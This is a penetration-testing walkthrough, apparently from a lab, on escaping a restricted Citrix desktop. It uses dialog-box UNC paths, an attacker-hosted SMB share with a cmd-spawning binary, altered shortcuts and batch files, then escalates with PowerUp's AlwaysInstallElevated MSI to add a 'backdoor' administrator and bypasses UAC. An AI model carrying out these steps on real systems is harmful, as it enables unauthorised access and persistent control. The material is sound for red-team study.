# Citrix Breakout

## Bypassing Path Restrictions

A group policy has been implemented to restrict users from browsing directories in the `C:\` drive using File Explorer. It is possible to utilise Windows dialogue boxes as a means to bypass the restrictions imposed by group policy.

Once a Windows dialogue box is obtained, the next step often involves navigating to a folder path containing native executables that offer interactive console access. Usually, we have the option to directly enter the folder path into the file name field to gain access to the file.

Numerous desktop applications deployed via Citrix are equipped with functionalities that enable them to interact with files on the operating system. Features like Save, Save As, Open, Load, Browse, Import, Export, Help, Search, Scan, and Print, usually provide an attacker with an opportunity to invoke a Windows dialogue box.

There are multiple ways to open dialogue box in Windows using tools such as Paint, Notepad, WordPad, etc.

Run the program from start menu and click on `File > Open` to open the dialogue box.

With the windows dialogue box open for paint, we can enter the [UNC](https://learn.microsoft.com/en-us/dotnet/standard/io/file-path-formats#unc-paths) path `\\127.0.0.1\c$\users\pmorgan` under the File name field, with File-Type set to `All Files` and upon hitting enter we gain access to the desired directory.

## Accessing SMB share from restricted environment

Having restrictions set, File Explorer does not allow direct access to SMB shares on the attacker machine, or the Ubuntu server hosting the Citrix environment. However, by utilising the [UNC](https://learn.microsoft.com/en-us/dotnet/standard/io/file-path-formats#unc-paths) path within the Windows dialogue box, it's possible to circumvent this limitation. This approach can be employed to facilitate file transfers from a different computer.

Start a SMB server from the Ubuntu machine using [impacket](../../../../toolbox/tooling/post-exploitation/impacket/ "mention") `smbserver.py` script.

```shellsession
root@ubuntu:/home/greg/Tools# smbserver.py -smb2support share $(pwd)

```

Back in the Citrix environment, initiate the application (like Paint) via the start menu. Proceed to navigate to the "File" menu and select "Open", thereby prompting the dialogue box to appear.

Within this Windows dialogue box associated with Paint, input the [UNC](https://learn.microsoft.com/en-us/dotnet/standard/io/file-path-formats#unc-paths) path as `\\10.13.38.95\share` into the designated "File name" field. Ensure that the File-Type parameter is configured to "All Files." Upon pressing the "Enter" key, entry into the share is achieved.

Due to the presence of restrictions within the File Explorer, direct file copying is not viable. Nevertheless, an alternative approach involves `right-clicking` on the executables and subsequently launching them. Right-click on the `pwn.exe` binary and select `Open`, which should prompt us to run it and a `cmd` console will be opened.

<figure><img src="../../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

The executable `pwn.exe` is a custom compiled binary from `pwn.c` file which upon execution opens up the `cmd`.

```c
#include <stdlib.h>
int main() {
  system("C:\\Windows\\System32\\cmd.exe");
}
```

We can then use the obtained `cmd` access to copy files from SMB share to pmorgans Desktop directory.

## Alternate Explorer

In cases where strict restrictions are imposed on File Explorer, alternative File System Editors like `Q-Dir` or `Explorer++` can be employed as a workaround. These tools can bypass the folder restrictions enforced by group policy, allowing users to navigate and access files and directories that would otherwise be restricted within the standard File Explorer environment.

Through the utilisation of `Explorer++`, the capability to copy files from the `\\10.13.38.95\share` location to the Desktop belonging to the user `pmorgan` has been successfully demonstrated in following screenshot.

<figure><img src="../../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

[Explorer++](https://explorerplusplus.com/) is highly recommended and frequently used in such situations due to its speed, user-friendly interface, and portability. Being a portable application, it can be executed directly without the need for installation, making it a convenient choice for bypassing folder restrictions set by group policy.

## Alternate Registry Editors

<figure><img src="../../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

Similarly when the default Registry Editor is blocked by group policy, alternative Registry editors can be employed to bypass the standard group policy restrictions. [Simpleregedit](https://sourceforge.net/projects/simpregedit/), [Uberregedit](https://sourceforge.net/projects/uberregedit/) and [SmallRegistryEditor](https://sourceforge.net/projects/sre/) are examples of such GUI tools that facilitate editing the Windows registry without being affected by the blocking imposed by group policy. These tools offer a practical and effective solution for managing registry settings in such restricted environments.

## Modify existing shortcut file

Unauthorised access to folder paths can also be achieved by modifying existing Windows shortcuts and setting a desired executable's path in the `Target` field.

The following steps outline the process:

1. `Right-click` the desired shortcut.
2. Select `Properties`.
3. Within the `Target` field, modify the path to the intended folder for access.\
   ![](<../../../../.gitbook/assets/image (8).png>)
4. Execute the Shortcut and `cmd` will be spawned

In cases where an existing shortcut file is unavailable, there are alternative methods to consider. One option is to transfer an existing shortcut file using an SMB server. Alternatively, we can create a new shortcut file using PowerShell. These approaches provide versatility in achieving our objectives while working with shortcut files.

## Script Execution

When script extensions such as `.bat`, `.vbs`, or `.ps` are configured to automatically execute their code using their respective interpreters, it opens the possibility of dropping a script that can serve as an interactive console or facilitate the download and launch of various third-party applications which results into bypass of restrictions in place.

This situation creates a potential security vulnerability where malicious actors could exploit these features to execute unauthorised actions on the system.

1. Create a new text file and name it "evil.bat".
2. Open "evil.bat" with a text editor such as Notepad.
3. Input the command `cmd` into the file.\
   ![](<../../../../.gitbook/assets/image (9).png>)
4. Save the file.

Upon executing the "evil.bat" file, it will initiate a Command Prompt window. This can be useful for performing various command-line operations.

## Escalating Privileges

Once access to the command prompt is established, it's possible to search for vulnerabilities in a system more easily. For instance, tools like [Winpeas](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) and [PowerUp](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1) can also be employed to identify potential security issues and vulnerabilities within the operating system.

Using `PowerUp.ps1`, we find that [Always Install Elevated](https://learn.microsoft.com/en-us/windows/win32/msi/alwaysinstallelevated) key is present and set.

We can also validate this using the Command Prompt by querying the corresponding registry keys:

```cmd-session
C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
		AlwaysInstallElevated    REG_DWORD    0x1


C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
		AlwaysInstallElevated    REG_DWORD    0x1
```

Once more, we can make use of PowerUp, using it's `Write-UserAddMSI` function. This function facilitates the creation of an `.msi` file directly on the desktop.

```powershell-session
PS C:\Users\pmorgan\Desktop> Import-Module .\PowerUp.ps1
PS C:\Users\pmorgan\Desktop> Write-UserAddMSI
	
Output Path
-----------
UserAdd.msi
```

Now we can execute `UserAdd.msi` and create a new user `backdoor:T3st@123` under Administrators group. Note that giving it a password that doesn’t meet the password complexity criteria will throw an error.

<figure><img src="../../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

Back in CMD execute `runas` to start command prompt as the newly created `backdoor` user.

```cmd-session
C:\> runas /user:backdoor cmd

Enter the password for backdoor: T3st@123
Attempting to start cmd as user "VDESKTOP3\backdoor" ...
```

## Bypassing UAC

Even though the newly established user `backdoor` is a member of `Administrators` group, accessing the `C:\users\Administrator` directory remains unfeasible due to the presence of User Account Control (UAC). UAC is a security mechanism implemented in Windows to protect the operating system from unauthorised changes. With UAC, each application that requires the administrator access token must prompt the end user for consent.

```cmd-session
C:\Windows\system32> cd C:\Users\Administrator

Access is denied.
```

Numerous [UAC bypass](https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC) scripts are available, designed to assist in circumventing the active User Account Control (UAC) mechanism. These scripts offer methods to navigate past UAC restrictions and gain elevated privileges.

```powershell-session
PS C:\Users\Public> Import-Module .\Bypass-UAC.ps1
PS C:\Users\Public> Bypass-UAC -Method UacMethodSysprep
```

<figure><img src="../../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

Following a successful UAC bypass, a new PowerShell window will be opened with higher privileges and we can confirm it by utilising the command `whoami /all` or `whoami /priv`. This command provides a comprehensive view of the current user's privileges. And we can now access the Administrator directory.
